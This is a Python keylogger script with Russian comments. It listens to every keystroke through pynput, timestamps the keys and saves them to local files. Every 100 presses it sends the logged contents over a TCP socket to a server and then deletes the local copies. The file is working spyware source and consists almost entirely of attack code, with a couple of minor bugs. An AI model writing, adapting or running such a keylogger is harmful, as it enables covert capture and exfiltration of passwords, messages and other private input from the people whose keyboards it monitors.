import os
import socket
import datetime
from pynput.keyboard import Key, Listener


class Client:
    def __init__(self, host: str = socket.gethostname(), port: int = 12345) -> None:
        self._host: str = host
        self._port: int = port
        self.client: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


    def connect_to_server(self) -> None:
        try:
            self.client.connect((self._host, self._port))  # соединение с серверным сокетом
        except socket.error as ex: 
            raise Exception(f"Connection to server failed: {ex}")


    def send_data(self, folder_path: str) -> None:
        try:
            # Проходимся по каждому файлу из директории и отправляем данные с файла на сервер
            for filepath in os.listdir(folder_path):
                data: str = self.__get_data_from_file(os.path.join(folder_path, filepath))
                self.client.send(data.encode())
        except socket.error as ex:
            raise Exception(f"Sending data to server failed: {ex}")


    def __get_data_from_file(self, filepath: str) -> str:
        try:
            # чтение файла построчно
            with open(filepath, 'r', encoding='utf-8') as file:
                lines: list[str] = file.readlines()
            return "".join(lines)
        except FileNotFoundError as ex:
            raise Exception(f"Getting data from file failed: {ex}")


    def close(self) -> None:
        self.client.close()  # закрытие соединения с серверным сокетом


class Keylogger:
    def __init__(self, client: Client) -> None:
        self._client: Client = client

        self._path_to_base_dir: str = os.path.dirname(__file__)  # путь до главной директории (keylogger)
        self._path_to_data_dir: str = os.path.join(self._path_to_base_dir, "data")  # путь до поддиректории data

        start_time: str = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")  # время запуска скрипта
        self._path_to_file: str = os.path.join(self._path_to_data_dir, start_time + ".txt")  # путь до созданного файла 

        self.PRESS_LIMIT: int = 10  # лимит нажатых клавиш перед тем, как произойдет запись в файл


    def run(self) -> None:
        self._client.connect_to_server()  # подключение к серверу

        # создание поддиректории data, если ее нету
        if not os.path.exists(self._path_to_data_dir):
            os.makedirs(self._path_to_data_dir)

        try:
            self.__create_file()  # создание файла для хранения данных
            self.__logging()  # отслеживание нажатий
        except Exception as ex:
            print(f"Something went wrong: {ex}")

        self.send_data_to_server(self._path_to_data_dir)  # отправка данных на сервер
        self._client.close()  # закрытие соединения

    
    def send_data_to_server(self) -> None:
        self._client.send_data(self._path_to_data_dir)  # отправка данных прочитанных с файлов, сохраненных в папке data на сервер

        # Очистка содержимого в папке data
        for filename in os.listdir(self._path_to_data_dir):
            file_path = os.path.join(self._path_to_data_dir, filename)
            try:
                if os.path.isfile(file_path):
                    os.remove(file_path)
            except Exception as ex:
                raise Exception(f"Client sending failed: {ex}")
        

    def __create_file(self) -> None:
        # создание файла для записи данных о нажатых клавишах
        try:
            file = open(self._path_to_file, 'w', encoding='utf-8') 
            file.close()
        except FileNotFoundError as ex:
            raise Exception(f'Creating file failed: {ex}')


# ==================== ПРОЦЕСС СЧИТЫВАНИЯ ДАННЫХ ======================================

    def __logging(self) -> None:
        keys_logs: list[str] = []  # список нажатых клавиш

        self.press_to_write_count = 0  # кол-во нажатий для сохранения в файл
        self.press_to_send_count = 0  # кол-во нажатий для отправки на сервер

        # метод срабатывающий при нажатии клавиши
        def on_press(key):
            k: str = str(key).replace("'", "")
            cur_date: str = datetime.date.today().isoformat()  # текущая дата
            cur_time: str = datetime.datetime.now().time().isoformat()[:-7]  # текущее время
            keys_logs.append(f'{cur_date}:{cur_time}:{k}\n')

            self.press_to_write_count += 1
            self.press_to_send_count += 1
            
            # запись данных 
            if self.press_to_write_count >= self.PRESS_LIMIT:
                self.__write_key(keys_logs)
                keys_logs.clear()
                self.press_count = 0

            # отправка данных на сервер, когда количество нажатых символов будет 100
            if self.press_to_send_count >= 100:
                self.send_data_to_server()
                self.press_to_send_count = 0

        # метод срабатывающий при отжиме клавиши
        def on_release(key):
            if key == Key.esc:
                self.__write_key(keys_logs)
                return False

        try:
            # прослушивание нажатий
            with Listener(on_press=on_press, on_release=on_release) as listener:
                listener.join()
        except Exception as ex:
            raise Exception(f"Keyboard listening failed: {ex}")


    def __write_key(self, keys: list[str]) -> None:
        # запись списка нажатых букв в файл
        try:
            mode: str = 'a' if os.path.exists(self._path_to_file) else 'w'
            with open(self._path_to_file, mode, encoding='utf-8') as file:
                file.writelines(keys)
        except Exception as ex:
            raise Exception(f"Writing key failed: {ex}")
        
# =====================================================================================


def main() -> None:
    client: Client = Client()
    keylogger: Keylogger = Keylogger(client)
    keylogger.run()


if __name__ == '__main__':
    main()
